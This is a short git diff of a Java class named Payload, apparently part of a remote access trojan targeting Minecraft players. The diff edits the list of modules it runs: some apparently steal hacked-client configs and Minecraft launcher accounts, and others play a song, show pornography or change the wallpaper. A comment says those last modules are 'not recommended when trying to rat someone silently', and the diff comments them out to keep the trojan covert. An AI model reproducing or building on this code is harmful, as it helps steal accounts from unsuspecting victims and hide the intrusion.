@@ -40,12 +40,13 @@ public final class Payload {
                 new EarthhackConfigs(),
                 new LegendwareScripts(),
                 new RusherhackConfigs(),
-                new MCLauncherAccounts(),
+                new MCLauncherAccounts()
 
-                //These are optional, not recommended when trying to rat someone silently.
+                /*These are optional, not recommended when trying to rat someone silently.
                 new PlaySong(),
                 new FurryPorn(),
                 new ChangeWallpaper()
+                 */
         ));
     }
 
